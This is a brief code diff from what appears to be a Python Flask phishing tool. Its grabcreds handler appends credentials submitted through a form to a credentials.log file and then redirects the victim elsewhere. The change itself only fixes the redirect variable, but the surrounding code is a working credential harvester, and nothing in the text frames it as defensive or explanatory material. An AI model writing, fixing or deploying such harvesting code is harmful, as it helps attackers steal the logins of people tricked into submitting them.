@@ -26,7 +26,7 @@ def grabcreds():
     data = request.form.to_dict(flat=False)
     with open("credentials.log", "a") as file:
         file.write(f"{list(data.keys())[0]} : {data[list(data.keys())[0]][0]}\n")
-    return redirect(url)
+    return redirect(redirect_url)
 
 
 
